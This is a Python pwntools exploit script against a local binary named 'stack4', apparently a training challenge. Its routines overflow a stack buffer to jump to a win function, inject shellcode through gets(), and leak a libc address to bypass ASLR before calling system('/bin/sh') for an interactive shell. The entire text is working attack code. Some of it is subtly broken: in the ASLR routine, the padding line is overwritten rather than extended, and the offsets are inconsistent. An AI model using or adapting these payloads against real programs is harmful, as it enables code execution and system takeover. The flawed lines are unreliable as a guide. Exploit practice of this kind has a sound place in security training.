from pwn import *
r = process("./stack4")
raw_input("Debug?")
def win():
	win = 0x080483F4
	payload = "a" *(0x50+8-0x10+4)
	payload += p32(win) #ret addr
	r.sendline(payload)

	
def shell():
	shellcode = asm(shellcraft.sh())
	get_plt = 0x804830c
	addrshell = 0x8049000
	payload = "a" *(0x50+8-0x10)
	payload += "a"*4 #ebp
	payload += p32(get_plt)  #ret add 1
	payload += p32(addrshell)  #ret add 2
	payload += p32(addrshell)  #arg
	r.sendline(payload)
	r.sendline(shellcode)
	r.interactive()


def shell_aslr():
	puts_plt = 0x804832c
	get_got = 0x80495fc
	main = 0x8048408
	offset_gets = 0x5F3E0
	offset_system = 0x3ada0
	offset_sh = 0xe5f2+5
	payload = "a" *(0x50+8-0x10)
	payload = "a"*4 #ebp
	payload += p32(puts_plt) #ret addr 1
	payload += p32(main) #ret addr 2
	payload += p32(get_got) #arg
	r.sendline(payload)
	res = r.recv(4)
	gets = u32(res)
	print hex(gets)
	
	libc = gets - offset_gets
	system = libc + offset_system
	sh = libc + offset_sh
	
	log.info("gets: %#x" % gets)
	log.info("libc: %#x" % libc)
	log.info("system: %#x" % system)
	log.info("sh: %#x" % sh)
	
	
	payload = "a" *(0x50-0x10)
	payload = "a"*4 #ebp
	payload += p32(system) #ret addr 1
	payload += p32(main) #ret addr 2
	payload += p32(sh) #shell
	r.sendline(payload)
	r.interactive()
	
# shell()
shell_aslr()
